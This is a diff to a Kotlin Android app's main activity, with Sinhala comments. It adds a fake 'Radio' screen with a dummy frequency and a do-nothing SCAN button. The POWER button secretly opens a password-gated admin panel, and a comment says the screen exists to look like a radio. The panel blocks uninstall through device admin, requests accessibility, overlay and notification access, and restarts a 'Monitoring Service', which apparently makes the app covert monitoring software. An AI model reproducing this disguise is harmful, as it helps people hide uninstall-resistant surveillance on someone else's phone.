@@ -6,11 +6,15 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Color
+import android.graphics.Typeface
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.view.Gravity
+import android.view.View
 import android.widget.Button
 import android.widget.EditText
 import android.widget.LinearLayout
@@ -47,32 +51,131 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        showPasswordScreen()
+        showRadioScreen()
     }
 
+    // ===== රේඩියෝ ස්ක්‍රීන් එක =====
+    private fun showRadioScreen() {
+        val layout = LinearLayout(this)
+        layout.orientation = LinearLayout.VERTICAL
+        layout.setBackgroundColor(Color.parseColor("#0B0B0B"))
+        layout.gravity = Gravity.CENTER_HORIZONTAL
+        layout.setPadding(40, 80, 40, 40)
+
+        // උඩ "Radio" කියන නම
+        val title = TextView(this)
+        title.text = "Radio"
+        title.textSize = 28f
+        title.setTextColor(Color.WHITE)
+        title.setTypeface(null, Typeface.BOLD)
+        title.gravity = Gravity.CENTER
+        layout.addView(title)
+
+        // හිස් ඉඩ
+        val spacer1 = View(this)
+        spacer1.layoutParams = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 100
+        )
+        layout.addView(spacer1)
+
+        // Frequency එක
+        val freq = TextView(this)
+        freq.text = "87.5 MHz"
+        freq.textSize = 56f
+        freq.setTextColor(Color.WHITE)
+        freq.setTypeface(null, Typeface.BOLD)
+        freq.gravity = Gravity.CENTER
+        layout.addView(freq)
+
+        // "Turn on the Radio" කියන එක
+        val subtitle = TextView(this)
+        subtitle.text = "Turn on the Radio."
+        subtitle.textSize = 16f
+        subtitle.setTextColor(Color.parseColor("#AAAAAA"))
+        subtitle.gravity = Gravity.CENTER
+        layout.addView(subtitle)
+
+        // හිස් ඉඩ
+        val spacer2 = View(this)
+        spacer2.layoutParams = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 80
+        )
+        layout.addView(spacer2)
+
+        // Power button එක
+        val powerBtn = Button(this)
+        powerBtn.text = "⏻ POWER"
+        powerBtn.textSize = 18f
+        powerBtn.setTextColor(Color.WHITE)
+        powerBtn.setBackgroundColor(Color.parseColor("#1E88E5"))
+        powerBtn.setPadding(60, 30, 60, 30)
+        layout.addView(powerBtn)
+
+        // හිස් ඉඩ
+        val spacer3 = View(this)
+        spacer3.layoutParams = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 40
+        )
+        layout.addView(spacer3)
+
+        // Scan button එක
+        val scanBtn = Button(this)
+        scanBtn.text = "🔍 SCAN"
+        scanBtn.textSize = 16f
+        scanBtn.setTextColor(Color.WHITE)
+        scanBtn.setBackgroundColor(Color.parseColor("#333333"))
+        scanBtn.setPadding(60, 20, 60, 20)
+        layout.addView(scanBtn)
+
+        // Power button එක ඔබද්දි ලොග් ස්ක්‍රීන් එකට යනවා
+        powerBtn.setOnClickListener {
+            showPasswordScreen()
+        }
+
+        // Scan button එක ඔබද්දි කිසිම දෙයක් වෙන්නේ නෑ (රේඩියෝ එකක් වගේ පෙන්නන්න)
+        scanBtn.setOnClickListener {
+            Toast.makeText(this, "Scanning...", Toast.LENGTH_SHORT).show()
+        }
+
+        setContentView(layout)
+    }
+
+    // ===== ලොග් ස්ක්‍රීන් එක =====
     private fun showPasswordScreen() {
         val layout = LinearLayout(this)
         layout.orientation = LinearLayout.VERTICAL
+        layout.setBackgroundColor(Color.parseColor("#0B0B0B"))
+        layout.gravity = Gravity.CENTER_HORIZONTAL
         layout.setPadding(60, 200, 60, 60)
 
         val title = TextView(this)
-        title.text = "System Service"
+        title.text = "Radio"
         title.textSize = 24f
+        title.setTextColor(Color.WHITE)
+        title.setTypeface(null, Typeface.BOLD)
+        title.gravity = Gravity.CENTER
         layout.addView(title)
 
         val subtitle = TextView(this)
         subtitle.text = "\n\nEnter password:"
         subtitle.textSize = 14f
+        subtitle.setTextColor(Color.parseColor("#AAAAAA"))
+        subtitle.gravity = Gravity.CENTER
         layout.addView(subtitle)
 
         val passInput = EditText(this)
         passInput.hint = "Password"
         passInput.inputType = android.text.InputType.TYPE_CLASS_TEXT or
                 android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+        passInput.setTextColor(Color.WHITE)
+        passInput.setHintTextColor(Color.parseColor("#666666"))
         layout.addView(passInput)
 
         val loginBtn = Button(this)
-        loginBtn.text = "Login"
+        loginBtn.text = "LOGIN"
+        loginBtn.textSize = 16f
+        loginBtn.setTextColor(Color.WHITE)
+        loginBtn.setBackgroundColor(Color.parseColor("#1E88E5"))
         layout.addView(loginBtn)
 
         loginBtn.setOnClickListener {
@@ -88,51 +191,72 @@ class MainActivity : AppCompatActivity() {
         setContentView(layout)
     }
 
+    // ===== Main Screen එක =====
     private fun showMainScreen() {
         val layout = LinearLayout(this)
         layout.orientation = LinearLayout.VERTICAL
+        layout.setBackgroundColor(Color.parseColor("#0B0B0B"))
         layout.setPadding(50, 80, 50, 50)
 
         val title = TextView(this)
-        title.text = "System Service — Admin"
+        title.text = "Radio — Admin"
         title.textSize = 20f
+        title.setTextColor(Color.WHITE)
+        title.setTypeface(null, Typeface.BOLD)
         layout.addView(title)
 
         statusText = TextView(this)
         statusText.text = "\n\n✅ Authenticated"
         statusText.textSize = 14f
+        statusText.setTextColor(Color.parseColor("#AAAAAA"))
         layout.addView(statusText)
 
         val enableAdminBtn = Button(this)
         enableAdminBtn.text = "Enable Device Admin (Block Uninstall)"
+        enableAdminBtn.setTextColor(Color.WHITE)
+        enableAdminBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(enableAdminBtn)
 
         val accBtn = Button(this)
         accBtn.text = "Accessibility Settings"
+        accBtn.setTextColor(Color.WHITE)
+        accBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(accBtn)
 
         val overlayBtn = Button(this)
         overlayBtn.text = "Overlay Settings"
+        overlayBtn.setTextColor(Color.WHITE)
+        overlayBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(overlayBtn)
 
         val notifBtn = Button(this)
         notifBtn.text = "Notification Access"
+        notifBtn.setTextColor(Color.WHITE)
+        notifBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(notifBtn)
 
         val battBtn = Button(this)
         battBtn.text = "Battery Settings"
+        battBtn.setTextColor(Color.WHITE)
+        battBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(battBtn)
 
         val restartBtn = Button(this)
         restartBtn.text = "Restart Monitoring Service"
+        restartBtn.setTextColor(Color.WHITE)
+        restartBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(restartBtn)
 
         val changePassBtn = Button(this)
         changePassBtn.text = "Change Password"
+        changePassBtn.setTextColor(Color.WHITE)
+        changePassBtn.setBackgroundColor(Color.parseColor("#333333"))
         layout.addView(changePassBtn)
 
         val uninstallBtn = Button(this)
         uninstallBtn.text = "Disable Protection & Uninstall"
+        uninstallBtn.setTextColor(Color.WHITE)
+        uninstallBtn.setBackgroundColor(Color.parseColor("#B00020"))
         layout.addView(uninstallBtn)
 
         enableAdminBtn.setOnClickListener { requestDeviceAdmin() }
@@ -220,21 +344,27 @@ class MainActivity : AppCompatActivity() {
         layout.setPadding(40, 40, 40, 40)
 
         val currentLabel = TextView(this); currentLabel.text = "Current password:"
+        currentLabel.setTextColor(Color.WHITE)
         layout.addView(currentLabel)
         val currentInput = EditText(this); currentInput.inputType =
             android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+        currentInput.setTextColor(Color.WHITE)
         layout.addView(currentInput)
 
         val newLabel = TextView(this); newLabel.text = "\nNew password:"
+        newLabel.setTextColor(Color.WHITE)
         layout.addView(newLabel)
         val newInput = EditText(this); newInput.inputType =
             android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+        newInput.setTextColor(Color.WHITE)
         layout.addView(newInput)
 
         val confirmLabel = TextView(this); confirmLabel.text = "\nConfirm new password:"
+        confirmLabel.setTextColor(Color.WHITE)
         layout.addView(confirmLabel)
         val confirmInput = EditText(this); confirmInput.inputType =
             android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+        confirmInput.setTextColor(Color.WHITE)
         layout.addView(confirmInput)
 
         androidx.appcompat.app.AlertDialog.Builder(this)
@@ -267,9 +397,11 @@ class MainActivity : AppCompatActivity() {
         layout.setPadding(40, 40, 40, 40)
 
         val label = TextView(this); label.text = "Enter password to disable protection:"
+        label.setTextColor(Color.WHITE)
         layout.addView(label)
         val input = EditText(this); input.inputType =
             android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+        input.setTextColor(Color.WHITE)
         layout.addView(input)
 
         androidx.appcompat.app.AlertDialog.Builder(this)
